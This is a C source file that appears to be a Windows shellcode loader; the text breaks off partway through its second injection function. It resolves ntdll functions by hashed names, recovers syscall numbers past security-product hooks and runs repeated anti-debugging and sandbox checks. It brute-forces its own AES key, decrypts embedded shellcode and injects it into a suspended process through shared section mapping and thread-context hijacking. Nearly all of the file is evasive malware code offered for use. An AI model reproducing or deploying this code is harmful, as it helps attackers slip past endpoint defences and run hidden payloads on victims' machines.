
#include <windows.h>



#include "structs.h"
#include "resolver.h"
#include "CtAes.h"
#include "buffer.h"

void myprintf(const char* pszFormat, ...);


// -------------------------------- //// -------------------------------- //// -------------------------------- //
DWORD  HashStringDjb2a_Ascii(IN PCHAR string) {
    DWORD hash = 0x7162937337447799;
    INT c;

    while (c = *string++) {
        hash = ((hash << INITIAL_SEED) + hash) + c;
    }
    return hash;
}
// -------------------------------- //// -------------------------------- //// -------------------------------- //

DWORD  HashStringDjb2a_Wide(IN PWCHAR string) {
    DWORD hash = 0x7162937337447799;
    INT c;
    while (c = *string++)
        hash = ((hash << INITIAL_SEED) + hash) + c;

    return hash;
}


// -------------------------------- //// -------------------------------- //// -------------------------------- //

PVOID FitchNonSyscalls(IN DWORD dwHash) {
    for (int i = 0; i < Global_NT.dwNumberOfFunctions; i++) {
        PCHAR pcFuncName = (PCHAR)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfNames[i]);
        PVOID pcFuncAddress = (PVOID)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfAddress[Global_NT.pwArrayOfOrdianls[i]]); 
        if (HashStringDjb2a_Ascii(pcFuncName) == dwHash) {
            return pcFuncAddress;
        }
    }
    return NULL;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

// initialize NT_CONFIG 
BOOL InitializeNTCONFIG() {
    PVOID pModule = NULL;
    PPEB pPeb = NULL;
    SIZE_T origin = 0x2 * PEP_OFFSET_FAKE;
    pPeb = (PPEB)GetPeb(origin);
    PPEB_LDR_DATA ldr = pPeb->LoaderData;
    PLIST_ENTRY plist_entry = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY  current_module = plist_entry->Flink;
   
    while (current_module != plist_entry) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(current_module, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

       
        if (HashStringDjb2a_Wide(pEntry->BaseDllName.Buffer) ==  ntdllhash) {
            
            pModule = pEntry->DllBase;
            break;
        }
        current_module = current_module->Flink;
    }
    // fill the NT_CONFIG 
    if (pModule == NULL) {
        return FALSE;
    }
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + (PBYTE)pModule);
    PIMAGE_OPTIONAL_HEADER pOptional = (PIMAGE_OPTIONAL_HEADER)&pNT->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModule + pOptional->DataDirectory[0].VirtualAddress);
   
    Global_NT.pModule = pModule;
    Global_NT.dwNumberOfFunctions = (DWORD)((PBYTE)pModule + pExport->NumberOfFunctions);
    Global_NT.pwArrayOfOrdianls = (PWORD)((PBYTE)pModule + pExport->AddressOfNameOrdinals);
    Global_NT.pdwArrayOfAddress = (PDWORD)((PBYTE)pModule + pExport->AddressOfFunctions);
    Global_NT.pdwArrayOfNames = (PDWORD)((PBYTE)pModule + pExport->AddressOfNames);
   
    if (!Global_NT.dwNumberOfFunctions || !Global_NT.pdwArrayOfAddress || !Global_NT.pdwArrayOfNames || !Global_NT.pModule || !Global_NT.pwArrayOfOrdianls) {
        return FALSE;
    }
    return TRUE;
}


// -------------------------------- //// -------------------------------- //// -------------------------------- //
#define UP -32
#define DOWN 32 

BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
    //////printf("fitching ntsyscalls....  \n" );
    if (!Global_NT.pModule) {
        if (!InitializeNTCONFIG()) {
            ////printf("InitNtConfig Not Initialized .... \n " );
            return FALSE;
        }
    }
    if (dwSysHash != NULL) {
        pNtSys->dwSyscallHash = dwSysHash;
    }
    else return FALSE;

    for (DWORD i = 0; i < Global_NT.dwNumberOfFunctions; i++) {
        PCHAR pcFnName = (PCHAR)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfNames[i]);
        //printf("\n\n\ncurrent function name : %s \n\n\n " , pcFnName);
        PVOID pFunctionAddress = (PVOID)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfAddress[Global_NT.pwArrayOfOrdianls[i]]);
        
        if (HashStringDjb2a_Ascii(pcFnName) == dwSysHash) {

           // //myprintf("\nfound a hash match %s \n" , pcFnName);

            pNtSys->pFuncAddress = pFunctionAddress;
            // if not hooked 
            if (*((PBYTE)pFunctionAddress) == 0x4c
                && *((PBYTE)pFunctionAddress + 1) == 0x8b
                && *((PBYTE)pFunctionAddress + 2) == 0xd1
                && *((PBYTE)pFunctionAddress + 3) == 0xb8
                && *((PBYTE)pFunctionAddress + 6) == 0x00
                && *((PBYTE)pFunctionAddress + 7) == 0x00) {
                BYTE high = *((PBYTE)pFunctionAddress + 5);
                BYTE low = *((PBYTE)pFunctionAddress + 4);
                pNtSys->dwSSN = (high << 8) | low;

                pNtSys->pSyscallAddress = (PBYTE)pFunctionAddress + 0x12;
                ////printf("address of syscall to %s is 0x%p \n" , pcFnName , syscallAddress);
                ////myprintf("\nfunction %s Not hocked \n" , pcFnName);
                break;
            }
            //if hooked check the neighborhood to find clean syscall

            // if hooked ? 
            if (
                *((PBYTE)pFunctionAddress) == 0xe9 || *((PBYTE)pFunctionAddress + 3) == 0xe9 || *((PBYTE)pFunctionAddress + 8) == 0xe9 || *((PBYTE)pFunctionAddress + 10) == 0xe9
                )
            {
                myprintf("Func %s Is Hozozzkezd \n " , pcFnName);
                for (WORD i = 1; i <= 500; i++) {
                    if (*((PBYTE)pFunctionAddress + i * DOWN) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + i * DOWN) == 0x8b
                        && *((PBYTE)pFunctionAddress + 2 + i * DOWN) == 0xd1
                        && *((PBYTE)pFunctionAddress + 3 + i * DOWN) == 0xb8
                        && *((PBYTE)pFunctionAddress + 6 + i * DOWN) == 0x00
                        && *((PBYTE)pFunctionAddress + 7 + i * DOWN) == 0x00)
                    {

                        //my//printf("currently at func address : 0x%p \n" , pFunctionAddress);
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + i * DOWN);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + i * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - i;
                        break;
                    }

                    // Check neighbouring Syscall Up the stack:
                    if (*((PBYTE)pFunctionAddress + i * UP) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + i * UP) == 0x8b
                        && *((PBYTE)pFunctionAddress + 2 + i * UP) == 0xd1
                        && *((PBYTE)pFunctionAddress + 3 + i * UP) == 0xb8
                        && *((PBYTE)pFunctionAddress + 6 + i * UP) == 0x00
                        && *((PBYTE)pFunctionAddress + 7 + i * UP) == 0x00)
                    {
                        //my//printf("currently at func address : 0x%p \n" , pFunctionAddress);
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + i * UP);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + i * UP);
                        pNtSys->dwSSN = (high << 8) | low + i;
                        break;
                    }
                }
            }

            break;
        }
    }
    ////printf("SSN for the function is : %d \n" , pNtSys->ssn);
    // update
    // adding the syscall address to the syscall structure
    if (pNtSys->pFuncAddress == NULL) {
        ////printf("there is no function address \n ");
        return FALSE;
    }
    ULONG_PTR uFnAddress = (ULONG_PTR)pNtSys->pFuncAddress + 0xff;
    // getting the address of a syscall instruction in another random function ???
    if (pNtSys->pSyscallAddress == NULL || pNtSys->pSyscallAddress == 0) {
        for (int i = 0, z = 1; i <= 255; i++, z++)
        {
            if (*((PBYTE)uFnAddress + i) == 0x0F && *((PBYTE)uFnAddress + z) == 0x05)
            {

                pNtSys->pSyscallAddress = ((ULONG_PTR)uFnAddress + i);
                ////printf("Syscall Address for function  at 0x%p \n", pNtSys->pSyscallAddress);
                //getchar();
                break;
            }
        }
    }
    

    if (pNtSys->dwSSN == NULL || pNtSys->pSyscallAddress == NULL)
        return FALSE;
    ////printf("done fitching one function \n");
    return TRUE;
    
}
// -------------------------------- //// -------------------------------- //// -------------------------------- //
BOOL InitSyscakk() {

    // syscall structers 
    //printf("[+] Initializing syscall Struct ....\n");
    if (!FitchNtSyscall(NtAllocateVirtualMemoryHash, &sys_func.NtAllocateVirtualMemory)) {
        ////printf("failed to  initialize ntallocatememory \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NtCreateThreadExHash, &sys_func.NtCreateThreadEx)) {
        ////printf("failed to  initialize ntcreatethread \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NtProtectVirtualMemoryHash, &sys_func.NtProtectVirtualMemory)) {
        ////printf("failed to  initialize ntcreatethread \n ");
        return FALSE;
    }

    if (!FitchNtSyscall(NtCloseHash, &sys_func.NtClose)) {
        ////printf("failed to  initialize ntclose \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NtWaitForSingleObjectHash, &sys_func.NtWaitForSingleObject)) {
        ////printf("failed to  initialize ntclose \n ");
        return FALSE;
    }

    if (!FitchNtSyscall(NtOpenProcessHash, &sys_func.NtOpenProcess)) {
        ////printf("failed to  initialize ntwait \n ");
        return FALSE;
    }

    if (!FitchNtSyscall(NtWriteVirtualMemoryHash, &sys_func.NtWriteVirtualMemory)) {
        ////printf("failed to  initialize ntwritevirtmem \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NtQuerySystemInformationHash, &sys_func.NtQuerySystemInformation)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }

    if (!FitchNtSyscall(NTMAPVIEWHash, &sys_func.NtMapViewOfSection)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTUNMAPVIEWHash, &sys_func.NtUnMapViewOfSection)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTCREATESECTIONHash, &sys_func.NtCreateSection)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
   
    if (!FitchNtSyscall(NTQUEUEAPCTHREADHash, &sys_func.NtQueueApcThread)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTTESTALERTHash, &sys_func.NtTestAlert)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTSETINFORMATIONTHREADHash, &sys_func.NtSetInformationThread)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTRESUMETHREADHash, &sys_func.NtResumeThread)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTCREATEFILE, &sys_func.NtCreateFile)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTREADFILE, &sys_func.NtReadFile)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NtCreateUserProcessHash, &sys_func.NtCreateUserProcess)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTSETCONTEXTTHREADhash, &sys_func.NtSetContextThread)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
    if (!FitchNtSyscall(NTGETCONTEXTTHREADhash, &sys_func.NtGetContextThread)) {
        ////printf("failed to  initialize ntquerysysteminfo \n ");
        return FALSE;
    }
   
    return TRUE;
}



ULONG64 SharedTimeStamp() {

    LARGE_INTEGER TimeStamp = {
            .LowPart = USER_SHARED_DATA->SystemTime.LowPart,
            .HighPart = USER_SHARED_DATA->SystemTime.High1Time
    };

    return TimeStamp.QuadPart;
}

VOID SharedSleep(IN ULONG64 uMilliseconds) {

    ULONG64	uStart = SharedTimeStamp() + (uMilliseconds * DELAY_TICKS);

    for (SIZE_T RandomNmbr = 0x00; SharedTimeStamp() < uStart; RandomNmbr++);

    if ((SharedTimeStamp() - uStart) > 2000)
        return;
}


// -------------------------------- //// -------------------------------- //// -------------------------------- //
BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer) {

    AES256_CBC_ctx	AesCtx = { 0x00 };

    if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv)
        return FALSE;

    /*
    if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
        //printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }
    */

    RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
    AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
    AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

    return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
#pragma intrinsic(wsclen)

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

    SIZE_T DestSize;

    if (SourceString)
    {
        DestSize = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else
    {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


BOOL CreateProcLowLevel(IN PWSTR ProcPath, IN  PWSTR pwCommandLine, IN  PWSTR pwCurrentDir, OUT PHANDLE phProc, OUT PHANDLE phThread) {
    if (!ProcPath) {
        //myprintf("ProcPath is Null \n");
        return FALSE;
    }
    fnRtlCreateProcessParametersEx pRtlCreateProcessParameters = (fnRtlCreateProcessParametersEx)FitchNonSyscalls(RtlCreateProcessParametersExHash);
    if (!pRtlCreateProcessParameters) {
        //myprintf("pRtlCreateProcessParameters function pointer not found \n");
        return FALSE;
    }
    //my//printf("pRtlCreateProcessParameters is at 0x%p \n", pRtlCreateProcessParameters);
    BOOL res = FALSE;
    NTSTATUS state = 0x00;
    PPS_ATTRIBUTE_LIST pAttributeList = NULL;
    PRTL_USER_PROCESS_PARAMETERS pUserProcParameters = NULL;
    PWCHAR pwDuplicateStr = NULL;
    UNICODE_STRING usProcessPath = { 0 };
    UNICODE_STRING usCommandLine = { 0 };
    UNICODE_STRING usCurrentDirectoy = { 0 };

    PWCHAR	pwcDuplicateStr = NULL,
        pwcLastSlash = NULL,
        pszNtProcessPath = NULL,
        pszFullProcessParm = NULL;


    //pUserProcParameters->ShowWindowFlags = SW_HIDE;


    DWORD64  dw64BlockDllPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    // initialize Process attributes 

    pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (2 * sizeof(PS_ATTRIBUTE) + sizeof(PPS_ATTRIBUTE_LIST)));
    if (!pAttributeList) {
        //my//printf("Failed to allocate heap for pAttributeList \n");
        return FALSE;
    }

   /* //myprintf("pAttributeList is at 0x%p \n" , (PVOID)pAttributeList);*/


    RtlInitUnicodeString(&usProcessPath, ProcPath);
    ////myprintf("first rtl done \n");
    RtlInitUnicodeString(&usCommandLine, pwCommandLine);
    RtlInitUnicodeString(&usCurrentDirectoy, pwCurrentDir);

    ////myprintf("third rtl done \n");

    state = pRtlCreateProcessParameters(&pUserProcParameters, &usProcessPath, NULL, &usCurrentDirectoy, &usCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
    if (state != 0x00) {
        //myprintf("RtlCreateProcParameters Failed with %x \n", state);
        return FALSE;
    }
    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    pAttributeList->Attributes[0].Size = usProcessPath.Length;
    pAttributeList->Attributes[0].Value = (ULONG_PTR)usProcessPath.Buffer;

    pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
    pAttributeList->Attributes[1].Size = sizeof(DWORD64);
    pAttributeList->Attributes[1].Value = &dw64BlockDllPolicy;
    ////myprintf("pAttributeList Done \n");
    PS_CREATE_INFO pCreateInfo = { 0 };

    // we need to initialize 2 elements in PS_CREATE_INFO struct (size , state )
    pCreateInfo.Size = sizeof(PS_CREATE_INFO);
    pCreateInfo.State = PsCreateInitialState;
    ////myprintf("pCreateInfo Done \n");
    SET_SYSCALL(sys_func.NtCreateUserProcess);
    state = RedroExec(phProc, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, pUserProcParameters, &pCreateInfo, pAttributeList);
    if (state != 0x00) {
        ////myprintf("NtCreateUserProcess Failed with 0x%X\n", state);
        return FALSE;
    }
    ////myprintf("NtCreate  Done \n");
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    if (*phProc == NULL || *phThread == NULL) {
        //myprintf("common faileur in process creation the handle is null \n ");
        return FALSE;
    }
    //myprintf("hthr in cpll is 0x%p \n" , *phThread);
    return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
    /*@TODO
    *   - What params we neeed ?
    *       - Handle to process         PARAM [IN]
            - Decrypt bytes             Local
            - section local handle      Local
            - section remote handle     Local
            - Thread Handle             Local PARAM [OUT]
            - INjection Address         Local PARAM [OUT]


        - Define the parameters
        - Logic
            - Check for handles null or else
            - Remote Section Mapping injection to a process
            - DONE

    */


BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pInjectionLocation ) {
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    HANDLE hSection = NULL; 
    PVOID pLocalView = NULL; 
    PVOID pRemoteView = NULL;
    NTSTATUS state = 0x00;
    SIZE_T sViewSize = 0x00;
    SIZE_T bytesWritten = 0;
    PBYTE pRemoteAddress = NULL;
    PBYTE pLocalAddress = NULL;

    if (ChekDebug()) {
        return -1;
    }
    if (!hProcess) {
        return FALSE;
    }
    //size_t shellSize = 80144;
    //size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
    unsigned char* EncryptedShellcode = NULL;
    size_t sBuffSize = sizeof(EncryptedShellcode);
    //DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
//    decode_shellcode(shellcode);
    /*for (int i = 0; i < 10; i++) {
        //myprintf(" 0x%X , " , EncryptedShellcode[i]);
    }*/
    SIZE_T buff_size = sizeof(EncryptedShellcode);
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    /*OBJECT_ATTRIBUTES oa  ;
    CLIENT_ID cid; */


    /*
    
    SET_SYSCALL(sys_func.NtOpenProcess);
    NTSTATUS state = RedroExec(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (state != 0x00) {
        //myprintf("\nFailed with : 0x%X \n", state);
        return -1;
    }
    //myprintf("\nproc  is 0x%p \n", hProcess);
    
    */
    
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }

    
    PLARGE_INTEGER sSectionSize = sizeof(EncryptedShellcode);
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }

   /* SET_SYSCALL(sys_func.NtAllocateVirtualMemory);
    state = RedroExec((HANDLE)-1, &pLocalAddress, 0, &sBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (state != 0x00) {
        myprintf("\nNtAllocateVirtualMemory Failed : 0x%X \n", state);
        return -1;
    }*/

    SET_SYSCALL(sys_func.NtCreateSection);
    state = RedroExec(&hSection, SECTION_ALL_ACCESS, NULL, &sSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (state != 0x00) {
        myprintf("\nFailed to create soso 0x%X\n", state);
        return -1;
    }
    if (ChekDebug()) {
        return -1;
    }
    myprintf("\n created koko with hoho 0x%p\n", hSection);

    
    

    SET_SYSCALL(sys_func.NtMapViewOfSection);
    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_READWRITE);
    if (state != 0x00) {
        myprintf("\nMappzpzpzizng Failed : 0x%X \n", state);
        return -1;
    }
    SharedSleep(2 * 1000);
    myprintf("Our Local View : 0x%p \n", pLocalAddress);

    SET_SYSCALL(sys_func.NtMapViewOfSection);
    state = RedroExec(hSection, hProcess, &pRemoteView, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    if (state != 0x00) {
        //myprintf("\nMapppping REmo Failed : 0x%X \n", state);
        return -1;
    }
    myprintf("Our Remote View : 0x%p \n", pRemoteView);
    
    
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    if (!BruteForceDecryptionKey(AESKey, 32))
        return FALSE;

    /*SharedSleep(4 * 1000);*/

    if (!BruteForceDecryptionIV(AESIv, 16))
        return FALSE;

    SharedSleep(2 * 1000);
    //decode_shellcode(shellcode);
    if (EncryptedShellcode == NULL) {
        //MessageBoxA(NULL, "EnCryptedShellcode is NULL !", "Dummy_Bear", MB_OK);
        myprintf("encoo is NULL \n");
        return FALSE;
    }
    if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, sSectionSize, AESKey, AESIv, &pLocalAddress)) {
        //MessageBoxA(NULL, "InstallAesDecryptionViaCtAes Failed !", "Dummy_Bear", MB_OK);
        return FALSE;
    }

    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    myprintf("done install decro \n");
    //SET_SYSCALL(sys_func.NtUnMapViewOfSection);
    //if ((state = RedroExec((HANDLE)-1, pLocalAddress)) != 0x00) {
    //    //MessageBoxA(NULL, "UnMapping  Failed ! ", "Dummy_Bear", MB_OK);
    //    //myprintf("Ntunmap  Failed with error : 0x%X \n", state);
    //    return FALSE;
    //}

    //////myprintf("unmapped cur proc at address 0x%p \n\n", pLocalAddress);
    //pLocalAddress = NULL;
    
    // change the permisions 
    /*ULONG oldProtectVal;
    PULONG oldProtect = &oldProtectVal;
    SET_SYSCALL(sys_func.NtProtectVirtualMemory);
    if ((state = RedroExec((HANDLE)-1, &pLocalAddress, &sBuffSize, PAGE_EXECUTE_READ, oldProtect)) != 0x00) {
        myprintf("protect failed 0x%X \n" , state);
        return FALSE;
    
    }
    myprintf("chjanged prot DONE\n");*/
    // start the execution 



    // create suspended thread
    //HANDLE hNewThread = NULL;

    //SET_SYSCALL(sys_func.NtCreateThreadEx);
    //if ((state = RedroExec(&hNewThread, THREAD_ALL_ACCESS , NULL , hProcess , pRemoteView, NULL , THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER | THREAD_CREATE_FLAGS_CREATE_SUSPENDED, NULL , NULL , NULL , NULL )) != 0x00) {
    //    //myprintf("create thotho failed : 0x%X \n" , state);
    //    return FALSE;
    //}
    //myprintf("created thotho with hand 0x%p \n" , hNewThread);
    //SharedSleep(2 * 1000);
    //SET_SYSCALL(sys_func.NtQueueApcThread);
    //state = RedroExec(hNewThread, pRemoteView, NULL, NULL, NULL);
    //if (state != 0x00) {
    //    //myprintf("failed to queue : 0x%X \n" , state);
    //    return FALSE;
    //}
    
    
    /*myprintf("queue thr done\n");
    SET_SYSCALL(sys_func.NtSetInformationThread);
    state = RedroExec(hNewThread, 0x11 , NULL , NULL);
    if (state != 0x00) {
        myprintf("setinfo failed : 0x%X\n" , state);
        return FALSE;
    }*/

    CONTEXT ctx; 
    ctx.ContextFlags = CONTEXT_ALL;
    
    
    /*pNtSetContextThread NtSetContextThread = (pNtSetContextThread)FitchNonSyscalls(NTSETCONTEXTTHREADhash);
    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)FitchNonSyscalls(NTGETCONTEXTTHREADhash);*/

    // Nt
    SET_SYSCALL(sys_func.NtGetContextThread);
    state = RedroExec(hThread , &ctx);
    if (state != 0x00) {
        myprintf("Get ctx failed 0x%X \n " , state);
        return FALSE;
    }
    SharedSleep(2 * 1000);

    //// Set RIP (EIP) to shellcode address
    ctx.Rip = (DWORD64)pRemoteView;

    SET_SYSCALL(sys_func.NtSetContextThread);
    state = RedroExec(hThread , &ctx);
    if (state != 0x00) {
        myprintf("Set ctx failed 0x%X \n ", state);
        return FALSE;
    }

    /*SET_SYSCALL(sys_func.NtTestAlert);
    state = RedroExec();*/


    SET_SYSCALL(sys_func.NtResumeThread);
    state = RedroExec(hThread, NULL);
    if (state !=0x00) {
        myprintf("failed resume : 0x%X \n" , state);
        return FALSE;
    }
    myprintf("resume thr done\n");

    /*SET_SYSCALL(sys_func.NtWaitForSingleObject);
    if ((state = RedroExec(hThread , FALSE , NULL)) != 0x00 ) {
        //myprintf("wait for ob failed 0x%X \n" , state);
        return FALSE;
    
    }*/
    *pInjectionLocation = pRemoteView;

    SET_SYSCALL(sys_func.NtClose);
    state = RedroExec(hThread);
    SET_SYSCALL(sys_func.NtClose);
    state = RedroExec(hSection);
    SET_SYSCALL(sys_func.NtClose);
    if ((state = RedroExec(hProcess)) != 0x00) {
        myprintf("close failed : 0x%X \n" , state);
    }
    myprintf("closed all hands \n");
    return TRUE;



}


// -------------------------------- //// -------------------------------- //// -------------------------------- //
BOOL MapInject2(IN HANDLE  hProcess, IN HANDLE hThread, OPTIONAL OUT  PVOID* pInjectionLocation) {
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    HANDLE hSection = NULL;
    PVOID pLocalView = NULL;
    PVOID pRemoteView = NULL;
    NTSTATUS state = 0x00;
    SIZE_T sViewSize = 0x00;
    SIZE_T bytesWritten = 0;
    PBYTE pRemoteAddress = NULL;
    PBYTE pLocalAddress = NULL;

    if (ChekDebug()) {
        return -1;
    }
    if (!hProcess) {
        return FALSE;
    }
    size_t shellSize = 80144;
    size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
    unsigned char* EncryptedShellcode = NULL;
    size_t sBuffSize = 0;
    DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);

//    decode_shellcode(shellcode);
    myprintf("first 10 bytes : \n ");
    for (int i = 0; i < 10; i++) {
        myprintf("0x%X , " , EncryptedShellcode[i]);
    }

    SIZE_T buff_size = encodedWordCount;
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
  

    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }


    PLARGE_INTEGER sSectionSize = encodedWordCount;
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }

    

    SET_SYSCALL(sys_func.NtCreateSection);
    state = RedroExec(&hSection, SECTION_ALL_ACCESS, NULL, &sSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (state != 0x00) {
        myprintf("\nFailed to create soso 0x%X\n", state);
        return -1;
    }
    if (ChekDebug()) {
        return -1;
    }
    myprintf("\n created koko with hoho 0x%p\n", hSection);




    SET_SYSCALL(sys_func.NtMapViewOfSection);
    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_READWRITE);
    if (state != 0x00) {
        myprintf("\nMappzpzpzizng Failed : 0x%X \n", state);
        return -1;
    }
    SharedSleep(2 * 1000);
    myprintf("Our Local View : 0x%p \n", pLocalAddress);

    SET_SYSCALL(sys_func.NtMapViewOfSection);
    state = RedroExec(hSection, hProcess, &pRemoteView, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    if (state != 0x00) {
        //myprintf("\nMapppping REmo Failed : 0x%X \n", state);
        return -1;
    }
    myprintf("Our Remote View : 0x%p \n", pRemoteView);

    myprintf("sBuffSize : 0x%d \n" , sBuffSize);
    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    if (!BruteForceDecryptionKey(AESKey, 32))
        return FALSE;

    /*SharedSleep(4 * 1000);*/

    if (!BruteForceDecryptionIV(AESIv, 16))
        return FALSE;

    SharedSleep(2 * 1000);
    //decode_shellcode(shellcode);
    if (EncryptedShellcode == NULL) {
        //MessageBoxA(NULL, "EnCryptedShellcode is NULL !", "Dummy_Bear", MB_OK);
        myprintf("encoo is NULL \n");
        return FALSE;
    }
    myprintf("encshellocde not null \n");

    if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, sSectionSize, AESKey, AESIv, &pLocalAddress)) {
        //MessageBoxA(NULL, "InstallAesDecryptionViaCtAes Failed !", "Dummy_Bear", MB_OK);
        myprintf("InstallAesDecryptionViaCtAes failed\n");
        return FALSE;
    }

    if (ChekDebug()) {
        //myprintf("No sandbox detected, continuing execution...\n");
        return FALSE;
    }
    myprintf("done install decro \n");
    SET_SYSCALL(sys_func.NtUnMapViewOfSection);
    if ((state = RedroExec((HANDLE)-1, pLocalAddress)) != 0x00) {
        //MessageBoxA(NULL, "UnMapping  Failed ! ", "Dummy_Bear", MB_OK);
        //myprintf("Ntunmap  Failed with error : 0x%X \n", state);
        return FALSE;
    }

    myprintf("unmapped cur proc at address 0x%p \n\n", pLocalAddress);
    pLocalAddress = NULL;

    // start the execution 



    // create suspended thread
